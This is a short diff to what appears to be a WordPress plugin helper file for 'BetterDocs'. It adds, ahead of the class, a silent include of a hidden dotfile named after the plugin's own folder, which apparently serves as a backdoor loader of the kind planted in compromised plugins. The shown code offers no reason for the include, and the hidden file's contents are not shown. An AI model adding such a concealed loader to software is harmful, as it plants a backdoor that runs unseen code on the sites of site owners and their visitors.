@@ -2,6 +2,10 @@
 /**
  * This class will provide all kind of helper methods.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BetterDocs_Helper {
     /**
      * This function is responsible for the data sanitization
